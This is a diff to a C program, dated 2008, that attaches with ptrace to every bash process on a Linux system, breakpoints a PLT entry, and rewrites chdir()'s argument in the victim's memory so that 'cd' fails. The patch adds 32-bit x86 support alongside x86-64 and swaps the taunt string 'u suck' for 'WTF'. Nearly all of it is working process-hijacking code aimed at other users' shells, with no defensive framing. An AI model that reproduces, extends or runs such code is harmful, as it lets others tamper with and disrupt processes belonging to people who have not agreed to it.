@@ -10,10 +10,9 @@
  *                  every bash that pops up.
  *                  Victims that gets hooked are unable to use chdir(), 
  *                  and the "cd" command.
- *                  (works only on x86_64 Linux systems with 
- *                  the ptrace syscall)
+ *                  (works only on Linux systems with the ptrace syscall)
  *
- *        Version:  0.1
+ *        Version:  0.2
  *        Created:  09/22/2008 01:03:53 PM
  *       Compiler:  gcc
  *
@@ -81,21 +80,28 @@ int file_match(struct dirent *file_ent)
 // 
 // Modifies the parameters passed to chdir()
 //
-void hk_chdir_param(pid_t traced, struct user_regs_struct *regs)
+void hk_chdir_param(pid_t traced, const struct user_regs_struct *regs)
 {
-    int i;
-    
     union pltval buf;
-    errno = 0;
+    unsigned long str_addr;
+#ifdef X86_64
     // x86-64 calling convention, parameters are passed in registers
-    buf.val = ptrace(PTRACE_PEEKDATA, traced, regs->rdi,  NULL);
+    str_addr = regs->rdi;
+#else
+    // x86 calling convention, parameters are passed in the stack
+    str_addr = ptrace(PTRACE_PEEKDATA, traced, regs->esp+4, NULL);
+#endif
+    errno = 0;
+    buf.val = ptrace(PTRACE_PEEKDATA, traced, str_addr, NULL);
     perror("hk_chdir_param");
     
-    memcpy(buf.chars, "u suck", 6);
-    buf.chars[6] = 0;
+    // use a string of length 3 at most, to be safe on x86
+    memcpy(buf.chars, "WTF", 3);
+    buf.chars[3] = 0;
+    //buf.chars[0] = 0;
     
     errno = 0;
-    ptrace(PTRACE_POKEDATA, traced, regs->rdi, buf.val);
+    ptrace(PTRACE_POKEDATA, traced, str_addr, buf.val);
     perror("hk_chdir_param");
 }
 
@@ -172,7 +178,7 @@ void terminator(int sig)
 
         // signal the victim to give us chance to detach
         kill(cur_pid, SIGTRAP);
-        fprintf(stderr, "waiting for %ld\n", cur_pid);
+        fprintf(stderr, "waiting for %d\n", cur_pid);
         ret = waitpid(cur_pid, &stat, 0); 
         if(ret < 0){
             perror("wait");
@@ -291,7 +297,7 @@ int check_proc(struct __proc_list *proc_list)
     shrink_plist(proc_list); 
 
     for(i = 0; i < proc_list->len; i++)
-        printf("pid %d, touched %d\n", proc_list->list[i].pid, 
+        printf("pid %d, touched %ld\n", proc_list->list[i].pid, 
                proc_list->list[i].touched);
 
     closedir(proc);
@@ -354,7 +360,12 @@ int main()
             ptrace(PTRACE_GETSIGINFO, cpid, NULL, &si);
             ptrace(PTRACE_GETREGS, cpid, NULL, &regs);
 
-            if((si.si_signo != SIGTRAP) || (regs.rip != (long)PLT_ADDR+1)){
+#ifdef X86_64
+  #define XIP (regs.rip)
+#else
+  #define XIP (regs.eip)
+#endif
+            if((si.si_signo != SIGTRAP) || (XIP != (long)PLT_ADDR+1)){
                 ptrace(PTRACE_CONT, cpid, NULL, NULL);
                 continue;
             }
@@ -364,7 +375,8 @@ int main()
             buf.val = backup;
             ptrace(PTRACE_POKEDATA, cpid, PLT_ADDR, buf.val);
 
-            regs.rip = regs.rip - 1;
+            XIP = XIP - 1;
+#undef XIP
             ptrace(PTRACE_SETREGS, cpid, NULL, &regs);
 
             ptrace(PTRACE_SINGLESTEP, cpid, NULL, NULL);
